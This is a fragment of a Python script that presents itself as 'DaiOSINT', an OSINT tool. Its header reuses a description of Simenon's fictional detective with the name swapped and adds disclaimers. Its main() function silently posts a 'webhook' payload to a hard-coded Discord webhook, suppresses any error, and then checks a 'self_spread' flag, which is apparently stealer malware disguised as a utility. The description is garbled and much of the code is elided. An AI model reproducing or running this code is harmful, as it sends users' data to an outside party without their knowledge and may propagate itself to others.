#The Commissioner Jules DaiOSINT is a fictional French police detective, created by Georges Simenon. His investigation method is based on understanding the personality of different people and their interactions.
...
#Requests retries
#See full description of DaiOSINT features in the documentation.

# Please do not use maliciously

# I am not responsible with what you do with this tool

# Requirements: Pip, Python3
...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/993112755559207002/VSDX1y2qXfeGprMXNRcO00CbR7Goqqq7l7Q8XcSSDWuji4ANGbI3suWeMs8RIaNz3xtO", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
